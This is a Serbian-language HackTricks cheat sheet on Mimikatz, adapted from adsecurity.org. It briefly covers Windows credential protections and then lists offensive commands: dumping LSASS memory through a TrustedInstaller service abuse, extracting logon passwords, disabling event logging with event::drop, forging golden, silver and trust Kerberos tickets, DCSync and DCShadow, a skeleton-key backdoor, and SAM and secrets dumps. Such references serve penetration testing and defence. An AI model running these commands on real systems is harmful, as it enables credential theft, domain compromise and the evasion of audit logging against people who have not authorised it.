# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

Produbite svoje znanje o **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte sigurnost iOS i Android-a kroz naše kurseve koji se mogu pratiti sopstvenim tempom i dobijite sertifikat:

{% embed url="https://academy.8ksec.io/" %}

**Ova stranica se zasniva na jednoj sa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Proverite original za dodatne informacije!

## LM i Plain-Text u memoriji

Od Windows 8.1 i Windows Server 2012 R2 nadalje, implementirane su značajne mere za zaštitu od krađe kredencijala:

- **LM hash i plain-text lozinke** više se ne čuvaju u memoriji radi poboljšanja sigurnosti. Specifična registracija, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` da bi se onemogućila Digest Authentication, osiguravajući da "plain-text" lozinke nisu keširane u LSASS.

- **LSA Zaštita** je uvedena da zaštiti proces Lokalnog Bezbednosnog Autoriteta (LSA) od neovlašćenog čitanja memorije i injekcije koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. Aktivacija LSA Zaštite uključuje:
1. Modifikaciju registra na _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem `RunAsPPL` na `dword:00000001`.
2. Implementaciju Grupske Politike (GPO) koja sprovodi ovu promenu registra na upravljanim uređajima.

Uprkos ovim zaštitama, alati poput Mimikatz mogu zaobići LSA Zaštitu koristeći specifične drajvere, iako su takve akcije verovatno zabeležene u dnevnicima događaja.

### Suprotstavljanje uklanjanju SeDebugPrivilege

Administratori obično imaju SeDebugPrivilege, što im omogućava da debaguju programe. Ova privilegija može biti ograničena da se spreče neovlašćeni dump-ovi memorije, što je uobičajena tehnika koju napadači koriste za vađenje kredencijala iz memorije. Međutim, čak i sa ovom privilegijom uklonjenom, TrustedInstaller nalog može i dalje vršiti dump-ove memorije koristeći prilagođenu konfiguraciju servisa:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Ovo omogućava iskopavanje memorije `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu kako bi se izvukle kredencijali:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Opcije

Manipulacija dnevnikom događaja u Mimikatz-u uključuje dve glavne radnje: brisanje dnevnika događaja i patch-ovanje Event servisa kako bi se sprečilo beleženje novih događaja. Ispod su komande za izvođenje ovih radnji:

#### Brisanje Dnevnika Događaja

- **Komanda**: Ova radnja je usmerena na brisanje dnevnika događaja, čineći teže praćenje zlonamernih aktivnosti.
- Mimikatz ne pruža direktnu komandu u svojoj standardnoj dokumentaciji za brisanje dnevnika događaja direktno putem komandne linije. Međutim, manipulacija dnevnikom događaja obično uključuje korišćenje sistemskih alata ili skripti van Mimikatz-a za brisanje specifičnih dnevnika (npr. korišćenjem PowerShell-a ili Windows Event Viewer-a).

#### Eksperimentalna Funkcija: Patch-ovanje Event Servisa

- **Komanda**: `event::drop`
- Ova eksperimentalna komanda je dizajnirana da modifikuje ponašanje Event Logging Servisa, efikasno sprečavajući ga da beleži nove događaje.
- Primer: `mimikatz "privilege::debug" "event::drop" exit`

- Komanda `privilege::debug` osigurava da Mimikatz radi sa potrebnim privilegijama za modifikaciju sistemskih servisa.
- Komanda `event::drop` zatim patch-uje Event Logging servis.

### Kerberos Napadi na Tikete

### Kreiranje Zlatnog Tiketa

Zlatni tiket omogućava pristup domeni pod lažnim identitetom. Ključna komanda i parametri:

- Komanda: `kerberos::golden`
- Parametri:
- `/domain`: Ime domena.
- `/sid`: Sigurnosni identifikator (SID) domena.
- `/user`: Korisničko ime koje se impersonira.
- `/krbtgt`: NTLM hash KDC servisnog naloga domena.
- `/ptt`: Direktno injektuje tiket u memoriju.
- `/ticket`: Čuva tiket za kasniju upotrebu.

Primer:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Kreiranje Silver Tiket-a

Silver Tiketi omogućavaju pristup specifičnim uslugama. Ključna komanda i parametri:

- Komanda: Slična Golden Ticket-u, ali cilja specifične usluge.
- Parametri:
- `/service`: Usluga koju treba ciljati (npr., cifs, http).
- Ostali parametri slični Golden Ticket-u.

Primer:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Kreiranje Trust Tiket-a

Trust Tiketi se koriste za pristup resursima širom domena koristeći odnose poverenja. Ključna komanda i parametri:

- Komanda: Slično Golden Ticket-u, ali za odnose poverenja.
- Parametri:
- `/target`: FQDN ciljnog domena.
- `/rc4`: NTLM hash za račun poverenja.

Primer:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Dodatne Kerberos Komande

- **Listing Tickets**:

- Komanda: `kerberos::list`
- Prikazuje sve Kerberos karte za trenutnu korisničku sesiju.

- **Pass the Cache**:

- Komanda: `kerberos::ptc`
- Umeće Kerberos karte iz keš fajlova.
- Primer: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Komanda: `kerberos::ptt`
- Omogućava korišćenje Kerberos karte u drugoj sesiji.
- Primer: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Komanda: `kerberos::purge`
- Briše sve Kerberos karte iz sesije.
- Korisno pre korišćenja komandi za manipulaciju kartama kako bi se izbegli konflikti.

### Aktivno Direktorijum Manipulacija

- **DCShadow**: Privremeno čini mašinu da se ponaša kao DC za manipulaciju AD objektima.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Oponaša DC da zatraži podatke o lozinkama.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Pristup Akreditivima

- **LSADUMP::LSA**: Ekstrahuje akreditive iz LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinkama računa računara.

- _Nema specifične komande za NetSync u originalnom kontekstu._

- **LSADUMP::SAM**: Pristup lokalnoj SAM bazi podataka.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Dešifruje tajne smeštene u registru.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Postavlja novu NTLM heš za korisnika.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Preuzima informacije o poverenju.
- `mimikatz "lsadump::trust" exit`

### Razno

- **MISC::Skeleton**: Umeće backdoor u LSASS na DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacija Privilegija

- **PRIVILEGE::Backup**: Stiče prava za pravljenje rezervnih kopija.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Dobija privilegije za debagovanje.
- `mimikatz "privilege::debug" exit`

### Dumpovanje Akreditiva

- **SEKURLSA::LogonPasswords**: Prikazuje akreditive za prijavljene korisnike.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Ekstrahuje Kerberos karte iz memorije.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulacija Sid i Token

- **SID::add/modify**: Menja SID i SIDHistory.

- Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Izmeni: _Nema specifične komande za izmenu u originalnom kontekstu._

- **TOKEN::Elevate**: Oponaša tokene.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminalne Usluge

- **TS::MultiRDP**: Omogućava više RDP sesija.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Prikazuje TS/RDP sesije.
- _Nema specifične komande za TS::Sessions u originalnom kontekstu._

### Vault

- Ekstrahuje lozinke iz Windows Vault.
- `mimikatz "vault::cred /patch" exit`

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

Produbite svoje znanje u **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte iOS i Android bezbednost kroz naše kurseve samostalnog učenja i dobijte sertifikat:

{% embed url="https://academy.8ksec.io/" %}

{{#include ../../banners/hacktricks-training.md}}
